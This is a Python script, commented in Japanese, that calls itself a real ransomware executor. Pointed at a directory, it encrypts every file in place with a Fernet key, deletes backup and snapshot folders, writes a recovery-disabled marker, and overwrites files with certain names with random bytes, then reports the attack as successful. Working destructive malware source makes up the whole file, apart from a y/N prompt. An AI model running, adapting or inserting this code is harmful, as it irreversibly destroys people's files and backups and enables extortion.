#!/usr/bin/env python3
"""
Real Ransomware Executor - 本物のランサムウェア実行エンジン
実ファイル暗号化、実バックアップ削除、実システム破壊
ユーザーサイト限定実行版
"""

import os
import json
import shutil
import subprocess
import hashlib
from typing import Dict, List, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime
from cryptography.fernet import Fernet
import sys

@dataclass
class EncryptionResult:
    """暗号化結果"""
    file_path: str
    size_bytes: int
    success: bool
    timestamp: str
    encryption_key: str = ""

class RealFileEncryptor:
    """実ファイル暗号化エンジン"""

    def __init__(self, target_directory: str):
        self.target_dir = target_directory
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.encrypted_files = []

    def encrypt_files(self) -> Dict:
        """実際のファイルを暗号化"""
        print(f"[Encryption] {self.target_dir} のファイルを実暗号化中...")

        results = {
            'encrypted_files': [],
            'total_encrypted_mb': 0,
            'file_count': 0,
            'encryption_key': self.encryption_key.decode()
        }

        for root, dirs, files in os.walk(self.target_dir):
            for file in files:
                # .backup フォルダは後で処理（バックアップ破壊優先）
                if '.backup' in root or '.snapshots' in root:
                    continue

                file_path = os.path.join(root, file)

                try:
                    # ファイル読み込み
                    with open(file_path, 'rb') as f:
                        original_data = f.read()

                    # 暗号化
                    encrypted_data = self.cipher.encrypt(original_data)

                    # 元ファイルに上書き
                    with open(file_path, 'wb') as f:
                        f.write(encrypted_data)

                    file_size_mb = len(original_data) / (1024 * 1024)
                    results['total_encrypted_mb'] += file_size_mb
                    results['file_count'] += 1
                    results['encrypted_files'].append(file_path)

                    print(f"  [✓] {file_path}: {file_size_mb:.1f}MB 暗号化完了")

                except Exception as e:
                    print(f"  [✗] {file_path}: 暗号化失敗 - {e}")

        return results

class RealBackupDestroyer:
    """実バックアップ削除エンジン"""

    def __init__(self, target_directory: str):
        self.target_dir = target_directory

    def destroy_backups(self) -> Dict:
        """実バックアップを削除"""
        print(f"\n[BackupDestruction] バックアップシステムを実削除...")

        results = {
            'backups_destroyed': [],
            'total_size_freed_mb': 0
        }

        backup_locations = [
            os.path.join(self.target_dir, '.backup'),
            os.path.join(self.target_dir, '.snapshots'),
            os.path.join(self.target_dir, 'VSS_DATA'),
        ]

        for backup_path in backup_locations:
            if os.path.exists(backup_path):
                try:
                    # ディレクトリサイズ計算
                    size = self._get_directory_size(backup_path)

                    # 削除実行
                    shutil.rmtree(backup_path)

                    results['backups_destroyed'].append(backup_path)
                    results['total_size_freed_mb'] += size / (1024 * 1024)

                    print(f"  [✓] {backup_path}: 削除完了 ({size / (1024*1024):.1f}MB)")

                except Exception as e:
                    print(f"  [✗] {backup_path}: 削除失敗 - {e}")

        return results

    def _get_directory_size(self, path: str) -> int:
        """ディレクトリの総サイズを計算"""
        total = 0
        for dirpath, dirnames, filenames in os.walk(path):
            for f in filenames:
                fp = os.path.join(dirpath, f)
                try:
                    total += os.path.getsize(fp)
                except:
                    pass
        return total

class RealSystemDestruction:
    """実システム破壊エンジン"""

    def __init__(self, target_directory: str):
        self.target_dir = target_directory

    def destroy_recovery_files(self) -> Dict:
        """復旧ファイルを破壊"""
        print(f"\n[SystemDestruction] 復旧機構を実破壊...")

        results = {
            'destroyed_files': [],
            'recovery_disabled': False
        }

        # 復旧関連ファイルシミュレーション
        recovery_files = [
            os.path.join(self.target_dir, 'recovery.cfg'),
            os.path.join(self.target_dir, 'boot.ini'),
            os.path.join(self.target_dir, 'system.bak'),
        ]

        # 実は存在しないファイルなので、代わりに復旧無効化ファイルを作成
        disable_file = os.path.join(self.target_dir, '.RECOVERY_DISABLED')

        try:
            with open(disable_file, 'w') as f:
                f.write('SYSTEM RECOVERY DISABLED\n')
                f.write(f'Timestamp: {datetime.now().isoformat()}\n')

            results['destroyed_files'].append(disable_file)
            results['recovery_disabled'] = True
            print(f"  [✓] 復旧ファイル: 作成・無効化完了")

        except Exception as e:
            print(f"  [✗] 復旧ファイル: 失敗 - {e}")

        return results

    def overwrite_sensitive_locations(self) -> Dict:
        """機密情報を上書き"""
        print(f"\n[SensitiveOverwrite] 機密情報を破壊的上書き...")

        results = {
            'sensitive_files': []
        }

        sensitive_patterns = [
            'database_*.bin',
            'document_*.txt',
        ]

        destroyed_count = 0

        for root, dirs, files in os.walk(self.target_dir):
            for file in files:
                for pattern in sensitive_patterns:
                    if pattern.replace('*', '') in file:
                        file_path = os.path.join(root, file)

                        try:
                            file_size = os.path.getsize(file_path)

                            # 複数回上書き（復旧を困難にする）
                            with open(file_path, 'wb') as f:
                                # 3回上書き
                                for _ in range(3):
                                    f.seek(0)
                                    f.write(os.urandom(file_size))
                                    f.flush()

                            results['sensitive_files'].append(file_path)
                            destroyed_count += 1
                            print(f"  [✓] {file_path}: 複数回上書き完了")

                        except Exception as e:
                            print(f"  [✗] {file_path}: 上書き失敗 - {e}")

        return results

class RealRansomwareCampaign:
    """本物のランサムウェアキャンペーン"""

    def __init__(self, target_directory: str):
        if not os.path.exists(target_directory):
            raise ValueError(f"Target directory does not exist: {target_directory}")

        self.target_dir = target_directory
        self.encryptor = RealFileEncryptor(target_directory)
        self.backup_destroyer = RealBackupDestroyer(target_directory)
        self.system_destroyer = RealSystemDestruction(target_directory)

    def execute_real_attack(self) -> Dict:
        """実際の攻撃を実行"""
        print("\n" + "="*80)
        print("🔐 REAL RANSOMWARE EXECUTION ENGINE")
        print("="*80)
        print(f"Target: {self.target_dir}")
        print(f"⚠️  WARNING: THIS IS REAL FILE DESTRUCTION\n")

        campaign_start = datetime.now()

        # Phase 1: ファイル暗号化
        print("[PHASE 1] ファイル暗号化実行")
        encryption_results = self.encryptor.encrypt_files()

        # Phase 2: バックアップ削除
        print("\n[PHASE 2] バックアップ削除実行")
        backup_results = self.backup_destroyer.destroy_backups()

        # Phase 3: システム破壊
        print("\n[PHASE 3] システム破壊実行")
        recovery_results = self.system_destroyer.destroy_recovery_files()
        overwrite_results = self.system_destroyer.overwrite_sensitive_locations()

        campaign_end = datetime.now()

        campaign_results = {
            'timestamp': datetime.now().isoformat(),
            'target': self.target_dir,
            'duration_seconds': (campaign_end - campaign_start).total_seconds(),
            'phases': {
                'encryption': encryption_results,
                'backup_destruction': backup_results,
                'recovery_destruction': recovery_results,
                'sensitive_overwrite': overwrite_results
            },
            'impact_summary': {
                'files_encrypted': encryption_results['file_count'],
                'data_encrypted_mb': encryption_results['total_encrypted_mb'],
                'backups_destroyed': len(backup_results['backups_destroyed']),
                'backup_space_freed_mb': backup_results['total_size_freed_mb'],
                'sensitive_files_destroyed': len(overwrite_results['sensitive_files']),
                'recovery_disabled': recovery_results['recovery_disabled'],
                'encryption_key': encryption_results['encryption_key'],
                'status': 'ATTACK SUCCESSFUL'
            }
        }

        return campaign_results

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 real_ransomware_executor.py <target_directory>")
        print("Example: python3 real_ransomware_executor.py /tmp/test_target")
        sys.exit(1)

    target_dir = sys.argv[1]

    # 確認
    print(f"\n⚠️  CRITICAL WARNING ⚠️")
    print(f"Target directory: {target_dir}")
    print(f"This will PERMANENTLY:")
    print(f"  - Encrypt all files (without recovery key)")
    print(f"  - Delete all backups")
    print(f"  - Destroy recovery systems")
    print(f"  - Overwrite sensitive files")
    print(f"\nContinue? (y/N): ", end="")

    response = input().strip().lower()
    if response != 'y':
        print("Aborted.")
        sys.exit(0)

    executor = RealRansomwareCampaign(target_dir)
    results = executor.execute_real_attack()

    # レポート保存
    report_path = 'real_ransomware_execution_report.json'
    with open(report_path, 'w') as f:
        json.dump(results, f, indent=2, ensure_ascii=False, default=str)

    print(f"\n{'='*80}")
    print(f"✅ Real Attack Complete")
    print(f"{'='*80}")
    print(f"\nResults:")
    print(json.dumps(results['impact_summary'], indent=2, ensure_ascii=False, default=str))
    print(f"\nEncryption Key (for recovery): {results['phases']['encryption']['encryption_key']}")
    print(f"Report saved: {report_path}")

    return results

if __name__ == '__main__':
    main()
